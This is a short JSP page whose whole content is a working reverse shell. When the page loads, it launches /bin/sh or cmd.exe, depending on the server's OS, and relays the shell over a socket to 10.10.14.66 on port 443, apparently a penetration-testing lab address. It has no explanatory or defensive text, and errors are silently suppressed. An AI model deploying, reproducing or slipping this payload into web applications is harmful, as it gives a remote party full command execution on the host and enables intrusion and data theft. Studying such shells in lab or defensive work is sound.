<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream kz;
    OutputStream l6;

    StreamConnector( InputStream kz, OutputStream l6 )
    {
      this.kz = kz;
      this.l6 = l6;
    }

    public void run()
    {
      BufferedReader nk  = null;
      BufferedWriter nV7 = null;
      try
      {
        nk  = new BufferedReader( new InputStreamReader( this.kz ) );
        nV7 = new BufferedWriter( new OutputStreamWriter( this.l6 ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = nk.read( buffer, 0, buffer.length ) ) > 0 )
        {
          nV7.write( buffer, 0, length );
          nV7.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( nk != null )
          nk.close();
        if( nV7 != null )
          nV7.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.66", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
